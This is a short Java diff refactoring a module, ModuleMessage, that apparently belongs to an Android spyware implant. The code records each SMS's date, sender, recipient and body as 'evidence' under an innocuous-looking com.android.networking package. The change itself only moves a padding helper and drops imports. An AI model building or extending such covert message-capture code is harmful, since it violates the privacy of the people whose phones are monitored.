@@ -10,10 +10,8 @@
 package com.android.networking.module;
 
 import java.io.IOException;
-import java.security.acl.LastOwnerException;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.Hashtable;
 import java.util.Iterator;
 
 import com.android.networking.LogR;
@@ -32,6 +30,7 @@ import com.android.networking.module.message.MmsBrowser;
 import com.android.networking.module.message.MsgHandler;
 import com.android.networking.module.message.Sms;
 import com.android.networking.module.message.SmsBrowser;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
@@ -360,8 +359,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		final DateTime filetime = new DateTime(new Date(date));
 		databuffer.writeLong(filetime.getFiledate());
-		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
-		databuffer.write(Utils.padByteArray(to.getBytes(), 16));
+		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
+		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
 		new LogR(EvidenceType.SMS_NEW, additionalData, body);
 	}
